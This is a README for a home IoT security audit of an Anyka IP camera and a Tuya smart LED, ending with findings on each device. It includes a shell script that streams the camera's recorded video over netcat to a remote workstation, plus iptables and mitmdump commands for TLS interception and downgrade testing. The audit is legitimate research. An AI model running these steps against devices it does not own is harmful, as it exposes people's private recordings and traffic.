
# IoT Security Audit Project: Anyka IP Camera & Smart LED

This project involves a comprehensive security analysis of two distinct IoT devices: an **Anyka-based IP Camera** and a **Tuya-based Smart LED Light**. The audit covers network reconnaissance, privilege escalation, hardware manipulation, and TLS traffic interception.

## 🛠 Tools Used
* **Nmap:** Network discovery and service enumeration.
* **Telnet:** Remote command-line access.
* **Raspberry Pi 4:** Configured as a Transparent Bridge and Wireless Access Point.
* **Mitmproxy / Mitmdump:** TLS traffic interception and certificate validation testing.
* **Wireshark:** Packet-level network analysis and protocol decoding.
* **FFplay:** Analysis of live H.264 video and PCM audio streams.
* **Python 3:** Custom scripts for data exfiltration and packet cleaning.

---

## 1. Anyka IP Camera Analysis

### A. Network Reconnaissance
Service discovery on the target device:
```bash
nmap -sV -p- 10.42.0.232
```

### B. Data Exfiltration System
A custom system designed to bypass limited environments and transfer recorded media from the camera to a remote workstation.

**Workstation Side (Receiver - Python):**
```python
#import socket
import sys

# --- SETTINGS ---
MAC_IP = "0.0.0.0"
CAMERA_IP = "10.42.0.232"


def main():
    print("Waiting for the file list from the device (listening on port 9000)...")

    # 1. Receive the file list from the camera
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind((MAC_IP, 9000))
            s.listen()

            conn, addr = s.accept()
            with conn:
                data = b""

                while True:
                    chunk = conn.recv(4096)
                    if not chunk:
                        break
                    data += chunk

    except Exception as e:
        print(f"Connection error: {e}")
        return

    # 2. Clean and prepare the file list
    raw_text = data.decode("utf-8", errors="ignore")
    raw_lines = raw_text.splitlines()
    files = []

    for line in raw_lines:
        # Skip directories and empty lines
        if not line.strip() or line.startswith("total") or line.startswith("d"):
            continue

        # In ls -l output, the final field is assumed to be the file path
        # Example: ./20250620/video.mp4
        filename = line.split()[-1]
        files.append((line, filename))

    if not files:
        print("❌ ERROR: No video files were found in the subdirectories.")
        return

    # 3. Download loop
    while True:
        print("\n" + "=" * 80)
        print(f"{'No':<4} {'File Information (All Subdirectories)'}")
        print("-" * 80)

        for i, (line, name) in enumerate(files):
            # Print the original ls -l line for readability
            print(f"[{i:<2}] {line}")

        print("=" * 80)

        selection = input("\nEnter the file number to download ('q' to quit): ")

        if selection.lower() == "q":
            print("Exiting...")
            break

        try:
            idx = int(selection)
            selected_file = files[idx][1]  # Example: ./20250620/video.mp4
        except (ValueError, IndexError):
            print("Invalid selection. Please try again.")
            continue

        # Convert the camera path into a local filename
        # ./20250620/video.mp4 -> 20250620_video.mp4
        local_filename = selected_file.replace("./", "").replace("/", "_")

        # 4. Send the file request to the camera
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((CAMERA_IP, 9001))
                s.sendall(selected_file.encode("utf-8"))

        except Exception as e:
            print(f"Could not send the request to the camera: {e}")
            continue

        # 5. Receive and save the file locally
        print(f"---> Downloading [{local_filename}] to your Mac. Please wait...")

        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.bind((MAC_IP, 9002))
                s.settimeout(15)
                s.listen()

                conn, addr = s.accept()

                with conn:
                    with open(local_filename, "wb") as f:
                        while True:
                            chunk = conn.recv(65536)
                            if not chunk:
                                break
                            f.write(chunk)

            print(f"✅ FILE SAVED SUCCESSFULLY: {local_filename}")

        except Exception as e:
            print(f"❌ DOWNLOAD ERROR: {e}")


if __name__ == "__main__":
    main()
```

**Camera Side (Sender - Shell Script):**
```bash
# /tmp/server_exfiltrate.sh
cd /mnt/DCIM/record
MAC_IP="192.168.1.x"
ls -l */* > /tmp/list.txt
cat /tmp/list.txt | nc $MAC_IP 9000
while true; do
    REQUEST=$(nc -l -p 9001)
    if [ -n "$REQUEST" ] && [ -f "$REQUEST" ]; then
        cat "$REQUEST" | nc $MAC_IP 9002
    fi
done
```

### C. Hardware & GPIO Manipulation
Direct interaction with the processor's GPIO pins to control physical components:
```bash
# Controlling the Status LED (Blue/Red)
sh /usr/sbin/state_led.sh on/off

# Manual IR-Cut Filter triggering (Mechanical Filter)
echo 42 > /sys/class/gpio/export
echo out > /sys/class/gpio/gpio42/direction
echo 0 > /sys/class/gpio/gpio42/value # Night Mode
echo 1 > /sys/class/gpio/gpio42/value # Day Mode

# Activating the Audio Amplifier
echo 82 > /sys/class/gpio/export
echo out > /sys/class/gpio/gpio82/direction
echo 1 > /sys/class/gpio/gpio82/value
```

---

## 2. Smart LED Light Analysis (TLS Interception)

### A. Raspberry Pi Gateway Configuration
Configuring the Linux kernel and network stack to act as a router for the target:
```bash
# Enable IPv4 Forwarding
sudo sysctl -w net.ipv4.ip_forward=1

# Configure NAT (Masquerade)
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
```

### B. Transparent Proxying
Tunneling the device's encrypted traffic into the analysis suite:
```bash
# Redirect Port 443, 8883, and 8886 traffic to mitmproxy (Port 8082)
sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 443 -j REDIRECT --to-port 8082
sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 8883 -j REDIRECT --to-port 8082
sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 8886 -j REDIRECT --to-port 8082
```

### C. TLS Audit and Downgrade Attack Testing
```bash
# Standard Transparent TLS Analysis
mitmdump --mode transparent --listen-port 8082 --showhost

# TLS 1.0 Downgrade vulnerability test
mitmdump --mode transparent --listen-port 8082 --set tls_version_default_max=tls10
```

---

## 3. Key Findings & Security Verdict

### Anyka IP Camera:
* **Vulnerability:** Unencrypted Telnet and FTP services are active by default.
* **Vulnerability:** Local video streams (H.264) are transmitted without encryption.
* **Security Strength:** Successfully implements TLS 1.2 and certificate validation for Cloud API communication.

### Smart LED Light:
* **Security Strength:** Implements strict **Certificate Pinning** for Cloud communication.
* **Security Strength:** Categorically rejects insecure legacy protocols (TLS 1.0).
* **Vulnerability:** Local network control (UDP 38899) accepts unencrypted JSON commands, allowing unauthorized local manipulation.

## 📄 Disclaimer
This project is conducted for educational and ethical security research purposes only. Unauthorized access to computer systems is prohibited.
